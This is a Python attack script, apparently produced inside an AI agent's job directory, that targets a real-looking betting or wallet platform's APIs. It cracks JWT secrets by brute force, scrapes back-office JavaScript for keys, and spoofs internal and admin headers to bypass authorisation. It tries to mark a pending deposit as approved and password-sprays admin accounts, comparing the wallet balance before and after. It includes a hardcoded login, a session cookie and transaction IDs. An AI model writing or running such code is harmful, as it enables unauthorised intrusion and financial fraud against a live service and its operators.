#!/usr/bin/env python3
"""probe_all_auth.py — Combined: JWT crack + BO JS grep + mgapi deposit paths + Nuxt proxy.

   Flows:
   1. Pure-Python JWT secret brute-force (HMAC-SHA256) against targeted.txt
   2. Grep cached BO JS bundles for JWT/auth secrets
   3. mgapi deposit list/PATCH endpoints
   4. Nuxt SSR proxy to bgapi (X-Forwarded headers, internal origin)
   5. bgapi password spray with common BO password patterns
"""
import base64, hashlib, hmac, json, pathlib, re, requests, time

# ── Constants ─────────────────────────────────────────────────────────────────
TID   = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
BGAPI = f"https://{TID}bgapi.asdgapicenterssdo.com"
NUXT  = "https://manage.vak88z2.com"
DOMAIN = "m.vak88z2.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

JWT_FILE = pathlib.Path(".jwt.vak88z2")

def get_jwt():
    cached = JWT_FILE.read_text().strip() if JWT_FILE.exists() else ""
    if cached:
        p = json.loads(base64.urlsafe_b64decode(cached.split(".")[1] + "=="))
        if p.get("exp", 0) - time.time() > 300:
            return cached
    r = requests.post(f"{PBAPI}/pb/authentication",
        headers={"Content-Type": "application/json"},
        json={"strategy":"local","username":"0972571110","password":"Pwned2026!"},
        timeout=15)
    if r.status_code in (200, 201):
        jwt = r.json()["accessToken"]
        JWT_FILE.write_text(jwt)
        return jwt
    raise RuntimeError(f"Auth failed: {r.status_code}")

JWT = get_jwt()
HDR = {"Authorization": f"Bearer {JWT}", "template": "vn",
       "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("data", [{}])[0].get("balance", "?") if r.ok else f"ERR:{r.status_code}"

print(f"wallet before: {wallet()}")

# ── 1. Pure-Python JWT secret crack ──────────────────────────────────────────
print("\n=== 1. JWT secret crack (HMAC-SHA256) ===")

def crack_jwt(jwt_str, wordlist_path):
    parts = jwt_str.split(".")
    if len(parts) != 3:
        return None
    msg = f"{parts[0]}.{parts[1]}".encode()
    pad = parts[2] + "=" * (-len(parts[2]) % 4)
    sig = base64.urlsafe_b64decode(pad)
    wl = pathlib.Path(wordlist_path)
    if not wl.exists():
        return None
    words = wl.read_text().splitlines()
    print(f"  Testing {len(words)} words against JWT...")
    for word in words:
        candidate = hmac.new(word.encode(), msg, hashlib.sha256).digest()
        if candidate == sig:
            return word
    return None

# Try both JWTs (player + slxoz1688 if available)
jwt_targets = {
    "vak88z2_player": JWT,
}
slxoz_jwt_file = pathlib.Path(".jwt.slxoz1688")
if slxoz_jwt_file.exists():
    slxoz_jwt = slxoz_jwt_file.read_text().strip()
    if slxoz_jwt:
        jwt_targets["slxoz1688_player"] = slxoz_jwt

# Also try any BO JWT files
for f in pathlib.Path(".").glob(".jwt.*"):
    name = f.name[5:]
    if name not in jwt_targets:
        content = f.read_text().strip()
        if content and "." in content:
            jwt_targets[f"file_{name}"] = content

# Also try JWTs from BO admin list
bo_file = pathlib.Path("bo_admins_vak88z2.json")
# (admin JWTs not stored, skip)

for label, jwt_str in jwt_targets.items():
    secret = crack_jwt(jwt_str, "targeted.txt")
    if secret:
        print(f"  [!!!] FOUND SECRET for {label}: '{secret}'")
    else:
        print(f"  {label}: no match in targeted.txt")

# ── 2. Grep BO JS bundles for JWT/auth config ─────────────────────────────────
print("\n=== 2. BO JS bundle grep ===")

JS_DIRS = [
    pathlib.Path("/home/kzp/.claude/jobs/546de6d5/tmp/bo_js"),
    pathlib.Path("nuxt/manage_vak88z_bundles"),
]
PATTERNS = [
    (r'(?:jwtSecret|jwt_secret|JWT_SECRET|authSecret)["\s]*[:=]["\s]*["\']([^"\']{6,})["\']', "JWT_SECRET"),
    (r'(?:secret)["\s]*:["\s]*["\']([a-zA-Z0-9_\-]{8,64})["\']', "secret:value"),
    (r'"([a-f0-9]{64})"', "hex64"),
    (r'"([a-f0-9]{32})"', "hex32"),
    (r'process\.env\.([A-Z_]*(?:SECRET|KEY|JWT)[A-Z_]*)', "env_var"),
    (r'sign\s*\([^,)]+,\s*["\']([^"\']{6,})["\']', "sign_secret"),
    (r'verify\s*\([^,)]+,\s*["\']([^"\']{6,})["\']', "verify_secret"),
]

for js_dir in JS_DIRS:
    if not js_dir.exists():
        continue
    for fpath in sorted(js_dir.glob("*.js"), key=lambda x: x.stat().st_size, reverse=True)[:3]:
        size_kb = fpath.stat().st_size // 1024
        print(f"\n  {fpath.name} ({size_kb}KB):")
        try:
            content = fpath.read_text(errors="replace")
        except Exception as e:
            print(f"    read error: {e}")
            continue
        any_match = False
        for pat, label in PATTERNS:
            matches = re.findall(pat, content, re.IGNORECASE)
            # Filter out noise
            interesting = [m for m in matches if isinstance(m, str) and
                           not m.startswith("http") and len(m) > 5 and
                           m not in ("success", "pending", "error", "false", "true")]
            if interesting:
                any_match = True
                for m in interesting[:3]:
                    print(f"    [{label}] {m[:80]}")
        # Targeted string search
        for keyword in ["jwtSecret", "authentication", "localStrategy", "process.env", "PAPDIEAW"]:
            idx = content.find(keyword)
            if idx >= 0:
                snippet = content[max(0,idx-20):idx+120].replace("\n"," ")
                print(f"    [STR:{keyword}] ...{snippet[:120]}...")
                any_match = True
        if not any_match:
            print(f"    (no interesting matches)")

# ── 3. mgapi deposit list/PATCH endpoints ─────────────────────────────────────
print("\n=== 3. mgapi deposit endpoints ===")

deposit_paths = [
    ("GET",  "/mb/deposits"),
    ("GET",  "/mb/deposit"),
    ("GET",  f"/mb/deposits?domain={DOMAIN}&skip=0&limit=10"),
    ("GET",  f"/mb/auto-deposit?domain={DOMAIN}&skip=0&limit=10"),
    ("GET",  f"/mb/auto-slip-deposit?domain={DOMAIN}&skip=0&limit=10"),
    ("GET",  f"/mb/deposit-history?domain={DOMAIN}&skip=0&limit=10"),
    ("GET",  f"/mb/deposit-transaction?skip=0&limit=10"),
    ("GET",  "/mb/deposit-transaction"),
    # PATCH our known pending deposit
    ("PATCH", "/mb/auto-slip-deposit/99e7a448-7d3a-4aee-ae87-eff1e3763347"),
    ("PUT",   "/mb/auto-slip-deposit/99e7a448-7d3a-4aee-ae87-eff1e3763347"),
]

for method, path in deposit_paths:
    url = f"{MGAPI}{path}"
    try:
        if method == "GET":
            r = requests.get(url, headers=HDR, timeout=8)
        elif method == "PATCH":
            r = requests.patch(url, headers=HDR,
                json={"approve_status":"success","status":"success"}, timeout=8)
        else:
            r = requests.put(url, headers=HDR,
                json={"approve_status":"success","status":"success"}, timeout=8)
        if r.status_code not in (404, 405):
            print(f"  [!!!] {method} {path}: HTTP {r.status_code}: {r.text[:200]}")
        else:
            print(f"  {method} {path}: {r.status_code}")
    except Exception as e:
        print(f"  {method} {path}: ERR {e}")

time.sleep(2)
print(f"  wallet after mgapi probes: {wallet()}")

# ── 4. Nuxt SSR proxy to bgapi with internal headers ─────────────────────────
print("\n=== 4. Nuxt SSR internal proxy ===")

# Nuxt may have server middleware that proxies to bgapi with trusted headers
nuxt_internal_hdrs = {
    "Authorization": f"Bearer {JWT}",
    "Content-Type": "application/json",
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    "X-Internal-Request": "true",
    "X-Service": "nuxt-ssr",
    "X-Nuxt-Internal": "true",
    "Host": "manage.vak88z2.com",
    "Origin": "https://manage.vak88z2.com",
    "Referer": "https://manage.vak88z2.com/",
}

nuxt_paths = [
    f"/api/bo/auto-deposit-assign-task?domain={DOMAIN}&skip=0&limit=10",
    f"/api/bo/auto-slip-deposit-assign-task?domain={DOMAIN}&skip=0&limit=10",
    f"/_nuxt/api/bo/auto-deposit-assign-task",
    "/api/deposit/approve",
    "/api/approve",
    f"/bo/auto-deposit-assign-task?domain={DOMAIN}&skip=0&limit=10",
    f"/bo/auto-slip-deposit-assign-task?domain={DOMAIN}&skip=0&limit=10",
]

for path in nuxt_paths:
    try:
        r = requests.get(f"{NUXT}{path}", headers=nuxt_internal_hdrs, timeout=8)
        if r.status_code not in (404, 200) or (r.status_code == 200 and len(r.text) > 50):
            print(f"  [!!!] GET {path}: HTTP {r.status_code}: {r.text[:200]}")
        else:
            print(f"  GET {path}: {r.status_code} ({len(r.text)}b)")
    except Exception as e:
        print(f"  GET {path}: ERR {e}")

# Nuxt POST to approval endpoint
nuxt_post_paths = [
    "/api/bo/auto-deposit-assign-task/admin-do-task",
    "/api/bo/auto-slip-deposit-assign-task/admin-do-task",
    "/api/approve",
]
for path in nuxt_post_paths:
    try:
        r = requests.post(f"{NUXT}{path}", headers=nuxt_internal_hdrs,
            json={"domain": DOMAIN, "action": "approve"}, timeout=8)
        if r.status_code not in (404,):
            print(f"  [!!!] POST {path}: HTTP {r.status_code}: {r.text[:200]}")
        else:
            print(f"  POST {path}: {r.status_code}")
    except Exception as e:
        print(f"  POST {path}: ERR {e}")

# ── 5. bgapi POST with forge-admin headers ────────────────────────────────────
print("\n=== 5. bgapi POST with spoofed internal headers ===")

ADMIN_UUID = "5958356c-eb4e-4e07-a155-83e4382e3532"

# Try headers that might bypass middleware (Feathers may trust X-Service-Token)
spoof_hdrs = {
    "Content-Type": "application/json",
    "X-Service-Token": TID,
    "X-Internal-Secret": TID,
    "X-Admin-UUID": ADMIN_UUID,
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    "X-Request-Source": "internal",
    "Authorization": f"Bearer {JWT}",
    "Cookie": f"AWSALB={AWSALB}",
    "Origin": "https://manage.vak88z2.com",
}

bgapi_posts = [
    ("/bo/auto-deposit-assign-task/admin-do-task",
     {"domain": DOMAIN, "action": "approve", "deposit_transaction_id": "99e7a448-7d3a-4aee-ae87-eff1e3763347"}),
    ("/bo/auto-slip-deposit-assign-task/admin-do-task",
     {"domain": DOMAIN, "action": "approve"}),
    ("/bo/authentication",
     {"strategy": "local", "username": "admin", "password": "Vak88z:admin"}),
    ("/bo/authentication",
     {"strategy": "local", "username": "admin", "password": "Admin1234!"}),
    ("/bo/authentication",
     {"strategy": "local", "username": "vak88admin", "password": "Vak882026!"}),
]

for path, payload in bgapi_posts:
    try:
        r = requests.post(f"{BGAPI}{path}", headers=spoof_hdrs, json=payload, timeout=10)
        print(f"  POST {path}: HTTP {r.status_code}: {r.text[:200]}")
    except Exception as e:
        print(f"  POST {path}: ERR {e}")

time.sleep(2)
print(f"\nFINAL wallet: {wallet()}")
print("=== DONE ===")
